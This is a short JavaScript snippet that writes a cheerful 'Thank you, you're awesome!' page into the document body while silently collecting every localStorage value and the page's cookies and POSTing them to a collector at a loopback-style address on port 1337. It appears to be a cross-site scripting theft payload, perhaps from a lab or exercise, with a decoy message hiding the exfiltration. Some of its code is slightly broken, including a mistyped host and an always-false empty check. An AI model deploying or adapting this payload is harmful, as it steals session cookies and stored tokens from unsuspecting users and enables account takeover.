let html = `
<style>
body {
    max-width: 650px;
    margin: 40px auto;
    padding: 0 10px;
    font: 18px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
    color:#444
}
h1, h2, h3 { line-height:1.2 }
</style>
<h1>Thank you<br>Who's awesome? You're awesome!</h1>    
`;
document.body.innerHTML = html;
(function(){
    const data = { t: Date.now() };
    Object.keys(window.localStorage).forEach((key)=>{
        data[key] = window.localStorage[key];
    });
    data.cookies = document.cookie;
    if(data == {}){ return false; }
    const request = { f: 'store', data: data };
    const url = 'http://127.0.01:1337';
    fetch(url, { 
        method: 'POST', cache: 'no-cache', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(request) 
    });
})();
